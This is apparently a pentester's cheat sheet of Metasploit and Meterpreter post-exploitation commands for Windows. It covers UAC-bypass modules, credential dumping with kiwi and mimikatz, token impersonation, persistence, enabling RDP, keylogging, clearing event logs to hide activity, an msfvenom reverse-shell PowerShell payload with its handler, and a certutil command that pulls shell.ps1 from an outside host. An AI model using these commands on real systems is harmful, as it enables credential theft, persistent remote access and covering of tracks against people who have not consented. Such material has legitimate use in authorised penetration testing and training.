# Print checksum of file
```
checksum md5 <file>
```

# Check PATH environment variables
```
getenv PATH
```

# Search for files
```
search -d <directory> -f <filename> # can use wildcards (*)
```


# Modules
```
exploit/windows/local/bypassuac_injection
windows/x64/meterpreter/reverse_tcp # set target to Windows x64
post/windows/gather/win_privs
post/windows/gather/enum_logged_on_users
post/windows/gather/checkvm
post/windows/gather/enum_applications
post/windows/gather/enum_av_excluded
post/windows/gather/enum_computers
post/windows/gather/enum_shares
```

# Token impersonation
```
# Load the incognito module into metaploit
load incognito

# List tokens
list_tokens -u
```

# Account hashes
```
# From within meterpreter
load kiwi

lsa_dump_sam
lsa_dump_secrets
creds_all

# upload mimikatz through certutil then launch mimikatz
sekurlsa::logonpassword
```

# Establis Windows Persistence
```
# From msf console
search platform:windows persistence
use windows/local/persistence_service

# Catch the shell
use multi/handler
set payload windows/meterpreter/reverse_tcp 
```


# Enable RDP
```
use windows/manage/enable_rdp
```

# Key Logging
use help command while in a meterpreter session

# Clear event logs
```
# Meterpeter
clearev
```

# Powershell script
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1
```

```
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT 4444; exploit"
```

certutil.exe -urlcache -split -f http://10.50.78.248:8000/shell.ps1
